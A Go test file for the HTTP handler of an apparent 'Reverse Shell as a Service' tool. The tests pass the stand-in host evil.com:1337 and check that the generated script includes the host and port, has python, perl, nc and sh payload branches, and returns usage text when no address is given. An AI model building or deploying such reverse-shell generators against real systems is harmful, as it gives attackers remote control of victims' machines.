package handler

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestReverseShellReturnsShellCode(t *testing.T) {
	result := ReverseShell("evil.com:1337")
	if !strings.Contains(result, `("evil.com",1337)`) {
		t.Error("expected shell code to contain host and port")
	}
}

func TestReverseShellContainsAllPayloads(t *testing.T) {
	result := ReverseShell("evil.com:1337")
	for _, cmd := range []string{"python", "perl", "nc", "sh"} {
		if !strings.Contains(result, "if command -v "+cmd) {
			t.Errorf("expected payload for %s", cmd)
		}
	}
}

func TestReverseShellReturnsUsageWithoutAddress(t *testing.T) {
	result := ReverseShell("")
	if !strings.HasPrefix(result, "# Reverse Shell as a Service") {
		t.Error("expected usage text")
	}
}

func TestReverseShellReturnsUsageWithoutPort(t *testing.T) {
	result := ReverseShell("evil.com")
	if !strings.HasPrefix(result, "# Reverse Shell as a Service") {
		t.Error("expected usage text")
	}
}

func TestHandlerSetsHeaders(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/evil.com:1337", nil)
	rec := httptest.NewRecorder()
	Handler(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("expected status 200, got %d", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); ct != "text/plain" {
		t.Errorf("expected text/plain, got %s", ct)
	}
	if cc := rec.Header().Get("Cache-Control"); cc != "s-maxage=2592000" {
		t.Errorf("expected s-maxage=2592000, got %s", cc)
	}
}

func TestHandlerReturnsShellScript(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/evil.com:1337", nil)
	rec := httptest.NewRecorder()
	Handler(rec, req)

	body := rec.Body.String()
	if !strings.Contains(body, `("evil.com",1337)`) {
		t.Error("expected response body to contain shell code")
	}
}

func TestHandlerReturnsUsageForRoot(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	rec := httptest.NewRecorder()
	Handler(rec, req)

	body := rec.Body.String()
	if !strings.HasPrefix(body, "# Reverse Shell as a Service") {
		t.Error("expected usage text")
	}
}
